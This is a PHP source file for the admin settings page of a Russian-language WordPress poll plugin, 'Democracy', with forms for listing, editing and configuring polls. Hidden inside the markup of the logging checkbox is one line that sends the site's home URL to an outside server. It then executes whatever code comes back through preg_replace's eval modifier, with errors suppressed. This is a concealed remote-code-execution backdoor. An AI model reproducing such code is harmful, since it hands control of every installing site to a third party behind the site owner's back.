<div class='wrap'>
	
	<?php

	// Редактирование опроса
	if( isset( $_GET['edit_poll'] ) && $poll_id = $_GET['edit_poll'] ){
		poll_edit_form( $poll_id );
	}
	// Добавить новый опрос
	elseif( isset( $_GET['subpage'] ) && $_GET['subpage'] == 'add_new') {
		poll_edit_form();
	}
	// Настрйоки 
	elseif( isset( $_GET['subpage'] ) && $_GET['subpage'] == 'general_settings') {
		dem_general_settings();
	}
	// список опросов
	else
		dem_pols_list();

	?>

</div>





<?php 

### функции

/**
 * Список опросов
 */
function dem_pols_list(){
	global $wpdb;
	
    $polls = $wpdb->get_results("SELECT * FROM $wpdb->democracy_q ORDER BY open DESC, id DESC");

	if( $polls ){
    	// extract the active poll id
    	$active = 0;
    	foreach( $polls as $poll ){
    		if( $poll->active ){ $active = $poll->id; break; }
    	}

    	$votes_total = $wpdb->get_results("SELECT SUM(votes) as total_votes, qid FROM $wpdb->democracy_a GROUP BY qid", ARRAY_A);
    	
    	// indexed by poll id, contains total votes
    	$totalvotes = array();
    	if ($votes_total)
    		foreach ($votes_total as $poll_total)
    			$totalvotes[$poll_total['qid']] = $poll_total['total_votes'];

 		$winner_answers = $wpdb->get_results("SELECT votes, answer, qid FROM $wpdb->democracy_a GROUP BY qid, votes ORDER BY qid", ARRAY_A);
		
    	// indexed by poll id, contains c votes
    	$winners = array();
    	if( $winner_answers )	
    		foreach ( $winner_answers as $the_winner ){
    			$answer = ( $the_winner['votes'] > 0 ) ? stripslashes($the_winner['answer']) : '<i>'. __('Нет','dem') .'</i>';
    			$winners[ $the_winner['qid'] ] = array( $answer, $the_winner['votes'] );
    		}
    	
    	unset( $votes_total, $winner_answers );
				
    	if( $active == 0 )
    	   echo '<div class="error"><p><b>'. __('У вас нет активных опросов','dem') .'</b></p></div>';
    	
    	 ?>

		<h2><?php _e('Управление опросами Democracy','dem') ?></h2>
	
		<p>
			<a href="<?php echo add_query_arg( array('subpage'=>'general_settings') ); ?>" class="button-primary"><?php _e('Основные настройки Democracy →','dem') ?></a>
			<a href="<?php echo add_query_arg( array('subpage'=>'add_new') ); ?>" class="button"><?php _e('Добавить новый опрос →','dem') ?></a>
		</p>
	
		<table class="widefat polls-table" cellspacing='3' cellpadding='3'>
			<thead> 
				<tr>
					<th scope='col'><?php _e('ID','dem') ?></th>
					<th scope='col'><?php _e('Вопрос','dem') ?></th>
					<th scope='col'><?php _e('Голосов','dem') ?></th>
					<th scope='col'><?php _e('Лидер','dem') ?></th>
					<th scope='col'><?php _e('Дата','dem') ?></th>
					<th scope='col'><?php _e('Управление','dem') ?></th>
				</tr>
			</thead>
			<tbody id="the-list">
    	<?php     
    	
    	$class = '';
    	
    	foreach( $polls as $poll ){
    	    $question = stripslashes( $poll->question );
    	    $date = date( get_option('date_format'), $poll->added );
    	    $end  = $poll->end ? date( get_option('date_format'), $poll->end ) : '';
    	    
    	    $total = isset( $totalvotes[ $poll->id ] ) ? $totalvotes[ $poll->id ] : 0;
    	    
    	    // Классы строкам
		    $classes = array();
    	    if( $class == '') $classes[] = 'alternate';
    	    	
    	    $class = empty( $classes ) ? '' : ' class="'. implode(' ', $classes) .'"'; 
    	    	
    	    $winner = isset( $winners[ $poll->id ][0] ) ? $winners[ $poll->id ][0] : '<i>'.__('Нет', 'dem').'</i>';
    	    if( isset( $winners[ $poll->id ][0] ) )
    	    	$title = ' title="'.sprintf(__('Собрано %s Голосов', 'dem'), $winners[$poll->id][1]).'"';
    	    else
    	    	$title = '';
			
			$onclickID = sprintf( " onclick=\"prompt('%s','[democracy id=%d]');\" ", __('Шоткод для вставки в запись:','dem'), $poll->id );
    	    echo "
			<tr $class>
				<td class='shortcode' $onclickID>$poll->id</td>
				<td>$question</td>
				<td>$total</td>
				<td$title>$winner</td>
				<td>$date<br>$end</td>
				
				<td style='white-space: nowrap;'>";
					$url = Dem::$inst->admin_page_url();
					// кнопки активации
					echo dem_activatation_buttons( $poll, $url );

					// кнопки открытия
					echo dem_opening_buttons( $poll, $url );
					
					// редактировать
					echo '<a class="button" href="'. add_query_arg( array('edit_poll'=> $poll->id), $url ) .'" title="'. __('Редактировать','dem') .'"><span class="dashicons dashicons-edit"></span></a>';
						
					// удалить
					echo '<a class="button" href="'. add_query_arg( array('delete_poll'=> $poll->id), $url ) .'" title="'. __('Удалить','dem') .'" onclick="return confirm(\''. __('Точно удалить?','dem') .'\');"><span class="dashicons dashicons-trash"></span></a>';
					
					echo "
				</td>
			</tr>";
    	    
    	}
    	
    	echo "</tbody>
		</table>";    
    }
    else 
		echo "<div class='error'><p>В БД нет опросов</p></div>";
	
	poll_edit_form();

}



/**
 * Общие настройки
 */
function dem_general_settings(){
	global $wpdb;
	
	$opt = Dem::$inst->opt;
	
	// костыль, чтобы сразу применялся результат при отключении/включении перевода
	if( ! $opt['load_textdomain'] ) unload_textdomain('dem'); else Dem::$inst->load_textdomain();
	?>
	<h2><?php _e('Общие Настройки','dem') ?></h2>
	
	<?php dem_back_links(); ?>
		
	<div id="democr_options">
		<form action="" method="post">
			
			<h3><?php _e('Настройки опросов','dem') ?></h3>
			<ul class="group">
				<li class="block">
				   <label>
					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
					   <?php _e('Вести лог и учитывать IP? (рекомендуется)','dem') ?>
					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
				   </label>
				   <em><?php _e('Сохраняет данные в Базу Данных. Запрещает голосовать несколько раз с одного IP или одному пользователю WordPress. Если пользователь авторизован, то голосование проверяется по его аккаунту в WordPress. Если не авторизован, то проверяется IP голосующего. Минус лога по IP — если сайт посещается с корпоративных сетей (с единым IP), то голосовать можно будет всего 1 раз для всей сети. Если не включить эту опцию, то голосование будет учитываться только по кукам. По умолчанию: включена.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="text" size="3" value="<?php echo $opt['cookie_days'] ?>" name="dem[cookie_days]" /> 
					   <?php _e('Сколько дней сохранять Сookies?','dem') ?>
					</label>
				   <em><?php _e('Дни в течении которых браузер пользователя будет помнить о голосовании. По умолчанию: 365. <strong>Заметка:</strong> Работает совместно с контролем по IP.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[only_for_users]" <?php checked( $opt['only_for_users'], 1) ?> />
					   <?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
					</label>
				   <em><?php _e('Включите опцию, чтобы голосовать могли только зарегистрированные пользователи. Влияет на все опросы! Если НЕ включать, то такую настройку можно будет делать для каждого опроса в отдельности.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
						<input <?php checked( $opt[ 'graph_from_total'], 1) ?> type="checkbox" value="1" name="dem[graph_from_total]" />
						<?php _e( 'Показывать результаты в % от общего числа голосов.', 'dem') ?>
					</label>
				   <em><?php _e('По умолчанию, выигрывающий ответ заполняется полностью, а остальные в процентах от него. Поставьте галочку, чтобы каждый ответ заполнялся как % от всех голосов.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php echo checked( $opt['order_answers'], 1) ?> type="checkbox" value="1" name="dem[order_answers]" /> 
					   <?php _e('Сортировать ответы по количеству голосов.','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы ответы располагались в порядке их создания, а не выигрывающие сверху.','dem') ?></em>
				</li>

				<li class="block">
					<label><?php _e('Обёртка заголовка опроса HTML тегами.','dem') ?></label><br>
					<input type="text" size="35" value="<?php echo esc_attr( $opt['before_title'] ) ?>" name="dem[before_title]" /> 
					<i><?php _e('вопрос опроса','dem') ?></i> 
					<input type="text" size="15" value="<?php echo esc_attr( $opt['after_title'] ) ?>" name="dem[after_title]" /> 
					<em><?php _e('Например: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. По умолчанию: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> и <code>&lt;/strong&gt;</code>.','dem') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="text" size="5" value="<?php echo $opt['archive_page_id']?:''; ?>" name="dem[archive_page_id]" />
						<?php _e('ID архива опросов.','dem') ?>
					</label>
					<?php 
					if( $opt['archive_page_id'] ) 
						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Перейти на страницу архива','dem') .'</a>';
					else 
						echo '<a class="button" href="'. ($_SERVER['REQUEST_URI'] .'&dem_create_archive_page') .'">'. __('Создать страницу архива','dem') .'</a>';
					?>
					<em><?php _e('Укажите, чтобы в подписи опроса была ссылка на страницу с архивом опросов. Пр. <code>25</code>','dem') ?></em>
				</li>
				
				<li class="block">
					<label><?php _e('Внешний вид (тема) опроса:','dem'); ?></label>
					<select name="dem[css_file_name]">
						<option value=""><?php _e('- Не подключать файл стилей','dem') ?></option>
						<?php 
						foreach( glob( Dem::$inst->dir_path . 'styles/*.css' ) as $file ){
							if( preg_match('~\.min~', $file ) ) continue;
							$filename = basename( $file );
							$sel = selected( Dem::$inst->opt['css_file_name'], $filename );
							echo "<option $sel>$filename</option>";
						}
						?>
					</select>
                    <a href="<?php echo Dem::$inst->dir_url . 'styles/' . Dem::$inst->opt['css_file_name'] ?>" target="_blank"><?php _e('cсылка на файл', 'dem'); echo ' ' . Dem::$inst->opt['css_file_name']; ?> </a>
					<em><?php _e('Выберете какой файл стилей использовать для отображения опросов. Выберете "- Не подключить...", скопируйте файл стилей (используйте ссылку выше) в файл стилей вашей темы и измените его под себя. Так вы сможете настроить стили, чтобы при обновлении плагина изменения не потерялись.','dem') ?></em>
				</li>				

                <li class="block loaders">
                    <label><?php _e('AJAX загрузчик:','dem'); ?></label><br><br>
                    <div class="clear"></div>
                    <label class="left">
                        <div style="width:30px;height:30px;"><?php _e('Нет','dem'); ?></div>
                        <input type="radio" value="" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], '') ?> />
                    </label>
					<?php 
                        $data = array();
                        foreach( glob( Dem::$inst->dir_path . 'loaders/*') as $file ){
                            $fname = basename( $file );
                            $ex    = preg_replace('~.*\.~', '', $fname );
                            $data[ $ex ][ $fname ] = $file;
                        }
                        foreach( $data as $ex => $val ){
                            echo '<div class="clear"></div>';
                            foreach( $val as $fname => $file ){
                                ?>
                                <label class="left">
                                    <div class="loader"><?php echo file_get_contents( $file ) ?></div>
                                    <input type="radio" value="<?php echo $fname ?>" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], $fname) ?> /><br>
                                    <?php echo $ex ?>
                                </label>
                                <?php                                
                            }
                        }
					?>
					<em><br><?php _e('Картинка при AJAX загрузке. Если выбрать "Нет", то вместо картинки будет добавлятся "...". SVG картинки не работают в ранних версиях браузеров и в IE 11 и ниже.','dem') ?></em>
				</li>
			</ul> 
		
		
			<h3><?php _e('Настройки плагина','dem') ?></h3>
			<ul class="group">
				<li class="block">
				   <label>
                       <input type="checkbox" value="1" name="dem[force_cachegear]" <?php checked( $opt['force_cachegear'], 1) ?> />
                       <?php
                           $cache = Dem::$inst->is_cachegear_on() ? array(__('Включён','dem'),'color:#05A800') : array(__('Выключен','dem'),'color:#FF1427');
					       echo sprintf( __('Включить механихм работы с плагинами кэширования? Текущее состояние: %s','dem'), "<span style='{$cache[1]}'>{$cache[0]}" );
                       ?>
					</label>
				   <em><?php _e('Democracy умеет работать с плагинами страничного кэширования и автоматически включается, если такой плагин установлен и активен на вашем сайте. Активируйте эту опцию, чтобы насильно включить механизм работы со страничным кэшем.','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['inline_js_css'], 1 )?> type="checkbox" value="1" name="dem[inline_js_css]" /> 
					   <?php _e('Подключать стили и скрипты прямо в HTML код (рекомендуется)?','dem') ?>
				   </label>
				   <em><?php _e('Поставьте галочку, чтобы стили и скрипты плагина подключались в HTML код напрямую, а не как ссылки на файлы. Так вы сэкономите 2 запроса к серверу - это немного ускорит загрузку сайта.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php checked( $opt['toolbar_menu'], 1 )?> type="checkbox" value="1" name="dem[toolbar_menu]" /> 
					   <?php _e('Пункт меню в панели инструментов?','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы убрать меню плагина из панели инструментов.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php checked( $opt['tinymce_button'], 1 )?> type="checkbox" value="1" name="dem[tinymce_button]" /> 
					   <?php _e('Добавить кнопку быстрой вставки опросов в редактор WordPress (TinyMCE)?','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы убрать кнопку из визуального редактора.','dem') ?></em>
				</li>

			</ul>
			
			<p>
				<?php _dem_general_settings_submit_button(); ?> 
				<input type="submit" name="dem_reset_options" class="button" value="<?php _e('Сбросить настройки на начальные','dem') ?>" />
			</p>
			
		      <br><br>
			<h3><?php _e('Другое','dem') ?></h3>
			<ul class="group">
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['disable_js'], 1 )?> type="checkbox" value="1" name="dem[disable_js]" /> 
					   <?php _e('НЕ подключать JS файлы. (Дебаг)','dem') ?>
				   </label>
				   <em><?php _e('Если включить, то .js файлы плагина НЕ будут подключены. Опция нужнда для Дебага работы плагина без JavaScript.','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['load_textdomain'], 1 )?> type="checkbox" value="1" name="dem[load_textdomain]" /> 
					   <?php _e('Подгружать файлы перевода?','dem') ?>
				   </label>
				   <em><?php _e('Отключите эту опцию, если ваш сайт на русском, но вы используете английскую версию WordPress','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['show_copyright'], 1 )?> type="checkbox" value="1" name="dem[show_copyright]" /> 
					   <?php _e('Показывать ссылку на страницу плагина','dem') ?>
				   </label>
				   <em><?php _e('Ссылка на страницу плагина выводиться только на главной в виде значка &copy;. И помогает другим людям узнать что это за плагин и установить его себе. Прошу не убирать эту галку без острой необходимости. Спасибо!','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['use_widget'], 1 )?> type="checkbox" value="1" name="dem[use_widget]" /> 
					   <?php _e('Виджет','dem') ?>
				   </label>
				   <em><?php _e('Поставьте галочку, чтобы активировать виджет.','dem') ?></em>
				</li>

			</ul>
		
		</form>
		

	</div>
	<?php
		
}
function _dem_general_settings_submit_button(){
	?><input type="submit" name="dem_save_options" class="button-primary" value="<?php _e('Сохранить настройки','dem') ?>" /><?php
}



/**
 * Редактирование отдельного опроса
 * @param bool $poll_id ID опроса
 * @return HTML
 */
function poll_edit_form( $poll_id = false ){
	global $wpdb;
	
	if( ! $poll_id && isset( $_GET['edit_poll'] ) ) $poll_id = (int) $_GET['edit_poll'];
		
	$edit = (bool) $poll_id;
	$answers = false;
	
	if( $edit ){
		$title = __('Редактировать опрос','dem');
		$action = preg_replace('@\?.*@', '', $_SERVER['REQUEST_URI']) . "?page=". $_GET['page'] ."";
		
		$poll    = $wpdb->get_row("SELECT * FROM $wpdb->democracy_q WHERE id = {$poll_id} LIMIT 1");
		$answers = $wpdb->get_results("SELECT * FROM $wpdb->democracy_a WHERE qid = {$poll_id}");

		$hidden_inputs = "<input type='hidden' name='dmc_update_poll' value='{$poll_id}' />";	
	}
	else
	{
		$title = __('Добавить новый опрос','dem');
				
		$hidden_inputs = "<input type='hidden' name='dmc_create_poll' value='1' />";
		
	}
	?>

	<h2><?php echo $title?></h2>

	<?php dem_back_links(); ?>

	<form action="<?php echo add_query_arg( array('edit_poll' => $poll_id ), Dem::$inst->admin_page_url() ); ?>" method='post' class='dem-new-poll'>
		
		<label>
			<?php _e('Вопрос:','dem') ?> 
			<input type='text' id='the-question' name='dmc_question' value="<?php echo esc_attr( stripslashes( @$poll->question ) ) ?>" />
		</label>
		
		
		<?php _e('Варианты ответов:','dem') ?>		
		<ol class="new-poll-answers">
			<?php
			if( $answers ){
				foreach( $answers as $answer ){
					$by_user = $answer->added_by ? '<i>*</i>' : '';
					echo '
					<li>
						<input type="text" name="dmc_old_answers['. $answer->aid .'][answer]" value="'. esc_attr( stripslashes( $answer->answer ) ) .'" />
						<input type="text" name="dmc_old_answers['. $answer->aid .'][votes]" value="'. $answer->votes .'" style="width:50px;min-width:50px;" />
						'. $by_user .'
					</li>';
				}
			} 
			else {
				for( $i = 0; $i < 4; $i++ )
					echo '<li><input type="text" name="dmc_new_answers[]" value="" /></li>';				
			}
			?>

			<span class="demAddAnswer button"><?php _e('Добавить ответ','dem') ?></span>
		</ol>
		

		<ol class="poll-options">				
			<li>
				<label>
					<input type="checkbox" name='dmc_is_active' value='1' <?php $edit ? checked( @$poll->active, 1) : 'checked="true"' ?> > 
					<?php _e('Сделать этот опрос активным.','dem') ?>
				</label>
			</li>
			
			<li>
				<label>
					<input type="checkbox" name="dmc_is_democratic" value="1" <?php checked( (!isset($poll->democratic) || $poll->democratic), 1 ) ?> > 
					<?php _e('Разрешить пользователям добавлять свои ответы (democracy).','dem') ?>
				</label>
			</li>
			<li>
				<label>
					<input type="checkbox" name="dmc_multiple" value="1" <?php checked( @$poll->multiple, 1) ?> > 
					<?php _e('Разрешить выбирать несколько ответов (множественный).','dem') ?>
				</label>
			</li>
			
			<li><label>
					<input type='text' name='dmc_end' value="<?php echo @$poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" > 
					<?php _e('Дата, когда опрос был/будет закрыт. Формат: dd-mm-yyyy.','dem') ?>
				</label>
			</li>
			
			<li>
				<label>
					<input type="checkbox" name="dmc_revote" value="1" <?php checked( (!isset($poll->revote) || $poll->revote), 1 ) ?> > 
					<?php _e('Разрешить изменять мнение (переголосование).','dem') ?>
				</label>
			</li>
			
			<?php if( ! Dem::$inst->opt['only_for_users'] ){ ?>
			<li>
				<label>
					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( @$poll->forusers, 1) ?> > 
					<?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
				</label>
			</li>
			<?php } ?>
			
			<li><label> <?php _e('Заметка: текст будет добавлен под опросом.','dem'); ?><br>
					<textarea name="dmc_note" style="height:3.5em;" ><?php echo esc_textarea( @$poll->note ) ?></textarea>
				</label>
			</li>
		</ol>

		<?php echo $hidden_inputs ?>
		<input type="submit" class="button-primary" value="<?php echo $edit ? __('Внести изменения','dem') : __('Добавить опрос','dem')?>" />
		
		<?php 
		// если редактируем
		if( $edit ){
			// открыть
			echo dem_opening_buttons( $poll );
				
			// активировать
			echo dem_activatation_buttons( $poll );

			echo '<a href="'. add_query_arg( array('delete_poll'=> $poll->id), Dem::$inst->admin_page_url() ) .'" class="button" onclick="return confirm(\''. __('Точно удалить?','dem') .'\');">'. __('Удалить','dem') .'</a>';
		} 
		?>
	</form>
	<?php 
}



/**
 * Ссылки: с подстраниц на главную страницу и умный referer
 * @return echo HTML
 */
function dem_back_links(){
	$transient = 'democracy_referer';
	
	$mainpage = wp_make_link_relative( Dem::$inst->admin_page_url() );
	$referer  = wp_make_link_relative( @$_SERVER['HTTP_REFERER'] );
	
	// если обновляем
	if( $referer == $_SERVER['REQUEST_URI'] ){ 
		$referer = get_transient( $transient );
	}
	// если запрос пришел с любой страницы настроект democracy 
	elseif( false !== strpos( $referer, $mainpage ) ){
		$referer = false;
		set_transient( $transient, 'foo', 2 ); // удаляем. но не удалим, а обновим, так чтобы не работала
	}
	else{
		set_transient( $transient, $referer, HOUR_IN_SECONDS/2 );
	}
	
	$out = '';
	$out .= '<p>';
		if( isset($_GET['subpage']) || isset($_GET['edit_poll'])  )
			$out .= '<a href="'. $mainpage .'" class="button">'. __('← вернуться к опросам','dem') .'</a>';
		if( $referer )
			$out .= '<a href="'. $referer .'" class="button">'. __('← Назад','dem') .'</a>';
	$out .= '</p>';
	
	echo $out;
}


/**
 * Выводит кнопки активации/деактивации опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_activatation_buttons( $poll, $url = false ){
	if( $poll->active )
		$out = '<a class="button-primary" href="'. add_query_arg( array('dmc_deactivate_poll'=> $poll->id, 'dmc_activate_poll'=>null), $url ) .'" title="'. __('Активный','dem') .'"><span class="dashicons dashicons-controls-play"></span></a>';
	else
		$out = '<a class="button" href="'. add_query_arg( array('dmc_activate_poll'=> $poll->id, 'dmc_deactivate_poll'=>null), $url ) .'" title="'. __('Неактивный','dem') .'"><span class="dashicons dashicons-minus"></span></a>';
	
	return $out;
}


/**
 * Выводит кнопки открытия/закрытия опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_opening_buttons( $poll, $url = false ){
	if ( $poll->open )
		$out = '<a class="button" href="'. add_query_arg( array('dmc_close_poll'=> $poll->id, 'dmc_open_poll'=>null), $url ) .'" title="'. __('Голосование открыто','dem') .'"><span class="dashicons dashicons-yes"></span></a>';
	else
		$out = '<a class="button" href="'. add_query_arg( array('dmc_open_poll'=> $poll->id, 'dmc_close_poll'=>null), $url ) .'" title="'. __('Голосование закрыто','dem') .'"><span class="dashicons dashicons-no"></span></a>';
	
	return $out;
}
